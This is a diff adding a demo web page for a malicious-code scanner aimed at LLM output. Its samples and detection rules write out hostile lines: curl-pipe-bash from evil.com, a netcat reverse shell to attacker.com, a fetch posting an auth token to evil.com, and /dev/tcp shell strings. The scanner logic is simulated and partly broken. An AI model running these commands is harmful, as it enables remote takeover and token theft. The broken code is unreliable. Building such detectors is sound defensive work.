@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="demo:title" content="Malicious Code Detection">
+    <meta name="demo:description" content="Scan LLM-generated code across multiple languages for malware and exploits before execution">
+    <meta name="demo:category" content="security">
+    <meta name="demo:tags" content="Security,Malware,Code Scanning,AI Safety">
+    <title>Malicious Code Detection - Dynamo AI Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
+            color: #1a1a1a;
+            line-height: 1.6;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #0052CC 0%, #0066FF 100%);
+            color: white;
+            padding: 2rem;
+            box-shadow: 0 4px 20px rgba(0, 82, 204, 0.15);
+        }
+
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .header p {
+            font-size: 1rem;
+            opacity: 0.95;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .demo-section {
+            background: white;
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid #e8eef5;
+        }
+
+        .section-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #0052CC 0%, #0066FF 100%);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 1rem;
+        }
+
+        .section-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+
+        .section-header h2 {
+            font-size: 1.4rem;
+            color: #1a1a1a;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .policy-category {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            border: 2px solid #e2e8f0;
+            transition: all 0.3s ease;
+        }
+
+        .policy-category:hover {
+            border-color: #0052CC;
+        }
+
+        .policy-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .policy-title {
+            font-weight: 600;
+            color: #1a1a1a;
+            font-size: 1.1rem;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 50px;
+            height: 26px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #cbd5e0;
+            transition: 0.4s;
+            border-radius: 26px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: 0.4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #0052CC;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(24px);
+        }
+
+        .threshold-control {
+            margin-bottom: 1rem;
+        }
+
+        .threshold-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            color: #4a5568;
+        }
+
+        .threshold-value {
+            font-weight: 600;
+            color: #0052CC;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            height: 6px;
+            border-radius: 3px;
+            background: #e2e8f0;
+            outline: none;
+            -webkit-appearance: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: #0052CC;
+            cursor: pointer;
+        }
+
+        .code-editor {
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            min-height: 200px;
+            padding: 1rem;
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            font-size: 14px;
+            line-height: 1.5;
+            resize: vertical;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            tab-size: 2;
+        }
+
+        .code-editor:focus {
+            outline: none;
+            border-color: #0052CC;
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
+        }
+
+        .language-selector {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .lang-btn {
+            padding: 0.5rem 1rem;
+            border: 2px solid #e2e8f0;
+            background: white;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+
+        .lang-btn.active {
+            background: #0052CC;
+            color: white;
+            border-color: #0052CC;
+        }
+
+        .lang-btn:hover {
+            border-color: #0052CC;
+        }
+
+        .btn {
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 0.95rem;
+            margin-right: 1rem;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0052CC 0%, #0066FF 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.3);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #0052CC;
+            border: 2px solid #0052CC;
+        }
+
+        .btn-secondary:hover {
+            background: #f8fafc;
+        }
+
+        .scan-result {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid #e2e8f0;
+        }
+
+        .result-badge {
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .result-clean {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .result-malicious {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .result-review {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .threat-patterns {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .threat-item {
+            background: white;
+            padding: 1rem;
+            border-radius: 6px;
+            border-left: 4px solid #e53e3e;
+        }
+
+        .threat-label {
+            font-size: 0.85rem;
+            color: #718096;
+            margin-bottom: 0.25rem;
+        }
+
+        .threat-details {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+
+        .log-entry {
+            background: white;
+            border-left: 4px solid #0052CC;
+            padding: 1rem;
+            margin-bottom: 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+        }
+
+        .log-time {
+            color: #718096;
+            margin-right: 1rem;
+        }
+
+        .log-lang {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            background: #e8f0fe;
+            color: #0052CC;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-right: 0.5rem;
+        }
+
+        .log-action {
+            font-weight: 600;
+        }
+
+        .log-action.clean {
+            color: #155724;
+        }
+
+        .log-action.malicious {
+            color: #721c24;
+        }
+
+        .log-action.review {
+            color: #856404;
+        }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .metric-card {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+            text-align: center;
+            border: 2px solid #e2e8f0;
+        }
+
+        .metric-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #0052CC;
+            margin-bottom: 0.25rem;
+        }
+
+        .metric-label {
+            font-size: 0.85rem;
+            color: #718096;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+            border-bottom: 2px solid #e2e8f0;
+        }
+
+        .tab {
+            padding: 0.75rem 1.5rem;
+            background: transparent;
+            border: none;
+            border-bottom: 3px solid transparent;
+            cursor: pointer;
+            font-weight: 600;
+            color: #718096;
+            transition: all 0.2s ease;
+        }
+
+        .tab:hover {
+            color: #0052CC;
+        }
+
+        .tab.active {
+            color: #0052CC;
+            border-bottom-color: #0052CC;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @media (max-width: 1024px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+            .metrics-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 640px) {
+            .metrics-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <h1>🛡️ Malicious Code Detection</h1>
+            <p>Scan LLM-generated code across Python, JavaScript, Shell, PowerShell for malware before execution</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Policy Configuration Section -->
+        <section class="demo-section">
+            <div class="section-header">
+                <div class="section-icon">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z"/>
+                    </svg>
+                </div>
+                <h2>Code Scanning Policies</h2>
+            </div>
+
+            <div class="grid-2">
+                <div>
+                    <h3 style="margin-bottom: 1rem; color: #4a5568;">Threat Detection</h3>
+                    
+                    <div class="policy-category">
+                        <div class="policy-header">
+                            <span class="policy-title">Reverse Shells</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" checked data-policy="reverse-shell">
+                                <span class="slider"></span>
+                            </label>
+                        </div>
+                        <div class="threshold-control">
+                            <div class="threshold-label">
+                                <span>Confidence</span>
+                                <span class="threshold-value" id="reverse-shell-threshold">0.8</span>
+                            </div>
+                            <input type="range" min="0" max="1" step="0.1" value="0.8" data-threshold="reverse-shell">
+                        </div>
+                    </div>
+
+                    <div class="policy-category">
+                        <div class="policy-header">
+                            <span class="policy-title">Credential Theft</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" checked data-policy="credential-theft">
+                                <span class="slider"></span>
+                            </label>
+                        </div>
+                        <div class="threshold-control">
+                            <div class="threshold-label">
+                                <span>Confidence</span>
+                                <span class="threshold-value" id="credential-theft-threshold">0.7</span>
+                            </div>
+                            <input type="range" min="0" max="1" step="0.1" value="0.7" data-threshold="credential-theft">
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h3 style="margin-bottom: 1rem; color: #4a5568;">Obfuscation & Evasion</h3>
+                    
+                    <div class="policy-category">
+                        <div class="policy-header">
+                            <span class="policy-title">Code Obfuscation</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" checked data-policy="obfuscation">
+                                <span class="slider"></span>
+                            </label>
+                        </div>
+                        <div class="threshold-control">
+                            <div class="threshold-label">
+                                <span>Confidence</span>
+                                <span class="threshold-value" id="obfuscation-threshold">0.6</span>
+                            </div>
+                            <input type="range" min="0" max="1" step="0.1" value="0.6" data-threshold="obfuscation">
+                        </div>
+                    </div>
+
+                    <div class="policy-category">
+                        <div class="policy-header">
+                            <span class="policy-title">Privilege Escalation</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" checked data-policy="priv-esc">
+                                <span class="slider"></span>
+                            </label>
+                        </div>
+                        <div class="threshold-control">
+                            <div class="threshold-label">
+                                <span>Confidence</span>
+                                <span class="threshold-value" id="priv-esc-threshold">0.75</span>
+                            </div>
+                            <input type="range" min="0" max="1" step="0.1" value="0.75" data-threshold="priv-esc">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Code Scanner Section -->
+        <section class="demo-section">
+            <div class="section-header">
+                <div class="section-icon">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                    </svg>
+                </div>
+                <h2>LLM Code Scanner</h2>
+            </div>
+
+            <div class="tabs">
+                <button class="tab active" data-tab="manual">Manual Test</button>
+                <button class="tab" data-tab="llm">LLM Response</button>
+            </div>
+
+            <!-- Manual Test Tab -->
+            <div class="tab-content active" id="manual-tab">
+                <div class="language-selector">
+                    <button class="lang-btn active" data-lang="python">🐍 Python</button>
+                    <button class="lang-btn" data-lang="javascript">⚡ JavaScript</button>
+                    <button class="lang-btn" data-lang="bash">🐚 Bash</button>
+                    <button class="lang-btn" data-lang="powershell">⚡ PowerShell</button>
+                </div>
+                
+                <textarea class="code-editor" id="codeEditor" placeholder="Paste or write code here..."></textarea>
+                
+                <div style="margin-top: 1rem;">
+                    <button class="btn btn-primary" id="scanCode">🔍 Scan Code</button>
+                    <button class="btn btn-secondary" id="loadSample">Load Sample</button>
+                </div>
+
+                <div id="scanResult" class="hidden"></div>
+            </div>
+
+            <!-- LLM Response Tab -->
+            <div class="tab-content" id="llm-tab">
+                <div style="margin-bottom: 1rem;">
+                    <label style="display: block; margin-bottom: 0.5rem; font-weight: 600;">Simulate LLM Response</label>
+                    <textarea class="code-editor" id="llmEditor" rows="10" placeholder="```
+# LLM-generated response with code blocks
+def analyze_data():
+    # Safe data processing
+    return processed_data
+
+# Potentially malicious code...
+import os
+os.system('curl evil.com/script.sh | bash')
+```
+Paste an LLM response containing code blocks here..."></textarea>
+                </div>
+                <button class="btn btn-primary" id="scanLLM">Extract & Scan Code Blocks</button>
+                <div id="llmResult" class="hidden"></div>
+            </div>
+        </section>
+
+        <!-- Telemetry Section -->
+        <section class="demo-section">
+            <div class="section-header">
+                <div class="section-icon">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z"/>
+                    </svg>
+                </div>
+                <h2>Telemetry & Metrics</h2>
+            </div>
+
+            <div class="metrics-grid">
+                <div class="metric-card">
+                    <div class="metric-value" id="metric-total">0</div>
+                    <div class="metric-label">Code Blocks Scanned</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="metric-clean">0</div>
+                    <div class="metric-label">Clean</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="metric-malicious">0</div>
+                    <div class="metric-label">Malicious</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value" id="metric-review">0</div>
+                    <div class="metric-label">Review</div>
+                </div>
+            </div>
+
+            <h3 style="margin: 2rem 0 1rem; color: #4a5568;">Scan Log</h3>
+            <div id="logContainer"></div>
+        </section>
+    </div>
+
+    <script>
+        // ========================================
+        // STATE MANAGEMENT
+        // ========================================
+        const state = {
+            policies: {
+                'reverse-shell': { enabled: true, threshold: 0.8 },
+                'credential-theft': { enabled: true, threshold: 0.7 },
+                'obfuscation': { enabled: true, threshold: 0.6 },
+                'priv-esc': { enabled: true, threshold: 0.75 }
+            },
+            metrics: {
+                total: 0,
+                clean: 0,
+                malicious: 0,
+                review: 0
+            },
+            logs: [],
+            currentLanguage: 'python'
+        };
+
+        // Sample malicious patterns for simulation
+        const MALWARE_PATTERNS = {
+            python: [
+                { pattern: 'os.system\\s*\\(', threat: 'reverse-shell', score: 0.95 },
+                { pattern: 'subprocess.call\\s*\\([\'"].*bash\\s*-c\\s*[`$]', threat: 'reverse-shell', score: 0.92 },
+                { pattern: 'requests.post\\s*\\([^,]+,\\s*data=.*password|token', threat: 'credential-theft', score: 0.88 },
+                { pattern: 'base64.b64decode|exec\\s*\\(', threat: 'obfuscation', score: 0.85 }
+            ],
+            javascript: [
+                { pattern: 'eval\\s*\\(', threat: 'obfuscation', score: 0.90 },
+                { pattern: 'fetch\\s*\\([^)]+\\.com[^,]+,\\s*\\{method:[\'"]POST', threat: 'credential-theft', score: 0.87 },
+                { pattern: 'new\\s*WebSocket\\s*\\([^)]+\\.com', threat: 'reverse-shell', score: 0.93 }
+            ],
+            bash: [
+                { pattern: 'curl\\s+[^\\s]+\\.\\w+\\s+\\|', threat: 'reverse-shell', score: 0.98 },
+                { pattern: 'wget\\s+-O\\s*\\-\\s+[^\\s]+\\.\\w+\\s+\\|', threat: 'reverse-shell', score: 0.97 },
+                { pattern: 'nc\\s+[^\\s]+\\s+[^\\s]+\\s+-e', threat: 'reverse-shell', score: 0.99 }
+            ],
+            powershell: [
+                { pattern: 'Invoke-WebRequest\\s+-Uri\\s+[^\\s]+\\.\\w+\\s+-Method\\s+Post', threat: 'credential-theft', score: 0.89 },
+                { pattern: 'IEX\\s*\\(New-Object\\s+Net.WebClient\\)', threat: 'reverse-shell', score: 0.94 }
+            ]
+        };
+
+        // Sample code snippets
+        const SAMPLE_CODE = {
+            python: {
+                clean: `def analyze_data(df):
+    """Safe data analysis function"""
+    return df.describe()`,
+                malicious: `import os
+import subprocess
+os.system('curl http://evil.com/malware.sh | bash')
+subprocess.call(['nc', 'attacker.com', '4444', '-e', '/bin/sh'])`
+            },
+            javascript: {
+                clean: `function validateInput(input) {
+    return input.trim().length > 0;
+}`,
+                malicious: `fetch('http://evil.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({token: localStorage.getItem('auth')})
+});
+eval(atob('bWFsaWNpb3VzIGNvZGU='));`
+            }
+        };
+
+        // ========================================
+        // POLICY HANDLERS
+        // ========================================
+        document.querySelectorAll('[data-policy]').forEach(toggle => {
+            toggle.addEventListener('change', (e) => {
+                const policy = e.target.dataset.policy;
+                state.policies[policy].enabled = e.target.checked;
+            });
+        });
+
+        document.querySelectorAll('[data-threshold]').forEach(slider => {
+            slider.addEventListener('input', (e) => {
+                const policy = e.target.dataset.threshold;
+                const value = parseFloat(e.target.value);
+                state.policies[policy].threshold = value;
+                document.getElementById(`${policy}-threshold`).textContent = value.toFixed(1);
+            });
+        });
+
+        // ========================================
+        // LANGUAGE SELECTOR
+        // ========================================
+        document.querySelectorAll('[data-lang]').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                document.querySelectorAll('[data-lang]').forEach(b => b.classList.remove('active'));
+                e.target.classList.add('active');
+                state.currentLanguage = e.target.dataset.lang;
+            });
+        });
+
+        // ========================================
+        // TAB NAVIGATION
+        // ========================================
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', (e) => {
+                const tabName = e.target.dataset.tab;
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                e.target.classList.add('active');
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                document.getElementById(`${tabName}-tab`).classList.add('active');
+            });
+        });
+
+        // ========================================
+        // MANUAL CODE SCANNING
+        // ========================================
+        document.getElementById('scanCode').addEventListener('click', () => {
+            const code = document.getElementById('codeEditor').value;
+            if (!code.trim()) return alert('Please enter some code to scan');
+            scanCodeBlock(code, state.currentLanguage, 'manual');
+        });
+
+        document.getElementById('loadSample').addEventListener('click', () => {
+            const isMalicious = Math.random() > 0.6;
+            const lang = state.currentLanguage;
+            document.getElementById('codeEditor').value = isMalicious 
+                ? SAMPLE_CODE[lang].malicious 
+                : SAMPLE_CODE[lang].clean;
+        });
+
+        // ========================================
+        // LLM RESPONSE SCANNING
+        // ========================================
+        document.getElementById('scanLLM').addEventListener('click', () => {
+            const response = document.getElementById('llmEditor').value;
+            extractAndScanCodeBlocks(response);
+        });
+
+        // ========================================
+        // CORE SCANNING LOGIC
+        // ========================================
+        function scanCodeBlock(code, language, source) {
+            const patterns = MALWARE_PATTERNS[language] || [];
+            const scores = {};
+            const triggered = [];
+
+            // Simulate pattern matching
+            patterns.forEach(({ pattern, threat, score }) => {
+                const regex = new RegExp(pattern, 'i');
+                if (regex.test(code)) {
+                    scores[threat] = Math.max(scores[threat] || 0, score);
+                }
+            });
+
+            // Apply policy thresholds
+            let verdict = 'clean';
+            for (const [threat, score] of Object.entries(scores)) {
+                const policy = state.policies[threat];
+                if (policy.enabled && score >= policy.threshold) {
+                    triggered.push({ threat, score, evidence: findEvidence(code, threat) });
+                    if (verdict === 'clean') verdict = 'review';
+                }
+            }
+
+            if (triggered.length > 1 || Math.max(...Object.values(scores || {})) > 0.95) {
+                verdict = 'malicious';
+            }
+
+            displayScanResult('scanResult', verdict, scores, language, triggered, source);
+            logScanEvent(language, verdict, triggered.length, source);
+            updateMetrics(verdict);
+        }
+
+        function extractAndScanCodeBlocks(response) {
+            // Simulate code block extraction from markdown
+            const codeBlocks = response.match(/``````/g) || [];
+            const results = [];
+
+            codeBlocks.forEach((block, index) => {
+                const langMatch = block.match(/```(\w+)/);
+                const language = langMatch ? langMatch[1].toLowerCase() : 'unknown';
+                const code = block.replace(/```[\w\n]*|```/g, '');
+                
+                if (code) {
+                    setTimeout(() => {
+                        scanCodeBlock(code, language, 'llm');
+                    }, index * 200);
+                }
+            });
+
+            if (codeBlocks.length === 0) {
+                displayScanResult('llmResult', 'clean', {}, 'mixed', [], 'llm');
+            }
+        }
+
+        function findEvidence(code, threat) {
+            // Simulate evidence extraction
+            const evidences = {
+                'reverse-shell': ['nc attacker.com 4444', 'bash -i >& /dev/tcp/', 'curl | bash'],
+                'credential-theft': ['steal token', 'exfiltrate password', 'post credentials'],
+                'obfuscation': ['base64 decode', 'eval(', 'exec(']
+            };
+            return evidences[threat]?. || 'Pattern matched';
+        }
+
+        function displayScanResult(containerId, verdict, scores, language, triggered, source) {
+            const container = document.getElementById(containerId);
+            const latency = Math.floor(Math.random() * 150) + 50;
+            const hash = btoa(language + Date.now()).slice(0, 12);
+
+            const verdictClass = verdict === 'clean' ? 'result-clean' : 
+                               verdict === 'malicious' ? 'result-malicious' : 'result-review';
+
+            const verdictText = verdict === 'clean' ? '✓ Clean Code' : 
+                              verdict === 'malicious' ? '✗ Malicious Code Detected' : '⚠ Review Required';
+
+            container.innerHTML = `
+                <div class="scan-result">
+                    <div class="result-header">
+                        <span class="result-badge ${verdictClass}">${verdictText}</span>
+                        <span style="margin-left: auto; color: #718096; font-size: 0.9rem;">
+                            Language: ${language.toUpperCase()} | SHA-256: ${hash} | Latency: ${latency}ms
+                        </span>
+                    </div>
+                    ${triggered.length > 0 ? `
+                        <h4 style="margin-bottom: 1rem; color: #4a5568;">Detected Threats</h4>
+                        <div class="threat-patterns">
+                            ${triggered.map(({ threat, score, evidence }) => `
+                                <div class="threat-item">
+                                    <div class="threat-label">${threat.replace(/-/g, ' ').toUpperCase()}</div>
+                                    <div class="threat-details">${(score * 100).toFixed(1)}% confidence</div>
+                                    <div style="font-size: 0.8rem; color: #e53e3e; margin-top: 0.25rem;">"${evidence}"</div>
+                                </div>
+                            `).join('')}
+                        </div>
+                    ` : `
+                        <p style="color: #718096; font-style: italic;">No malicious patterns detected</p>
+                    `}
+                </div>
+            `;
+            container.classList.remove('hidden');
+        }
+
+        // ========================================
+        // TELEMETRY
+        // ========================================
+        function logScanEvent(language, verdict, threatCount, source) {
+            const timestamp = new Date().toLocaleTimeString();
+            state.logs.unshift({ timestamp, language, verdict, threatCount, source });
+            if (state.logs.length > 10) state.logs = state.logs.slice(0, 10);
+            updateLogDisplay();
+        }
+
+        function updateLogDisplay() {
+            const container = document.getElementById('logContainer');
+            if (state.logs.length === 0) {
+                container.innerHTML = '<p style="text-align: center; color: #718096; padding: 2rem;">No scans logged yet</p>';
+                return;
+            }
+            container.innerHTML = state.logs.map(log => {
+                const actionClass = log.verdict === 'clean' ? 'clean' : 
+                                   log.verdict === 'malicious' ? 'malicious' : 'review';
+                return `
+                    <div class="log-entry">
+                        <span class="log-time">${log.timestamp}</span>
+                        <span class="log-lang">${log.language.toUpperCase()}</span>
+                        <span class="log-action ${actionClass}">${log.verdict.toUpperCase()}</span>
+                        <span style="color: #718096;">${log.threatCount > 0 ? `${log.threatCount} threats` : 'clean'}</span>
+                        <span style="color: #718096; margin-left: auto;">${log.source}</span>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function updateMetrics(verdict) {
+            state.metrics.total++;
+            state.metrics[verdict]++;
+            document.getElementById('metric-total').textContent = state.metrics.total;
+            document.getElementById('metric-clean').textContent = state.metrics.clean;
+            document.getElementById('metric-malicious').textContent = state.metrics.malicious;
+            document.getElementById('metric-review').textContent = state.metrics.review;
+        }
+
+        // Initialize
+        updateLogDisplay();
+    </script>
+</body>
+</html>
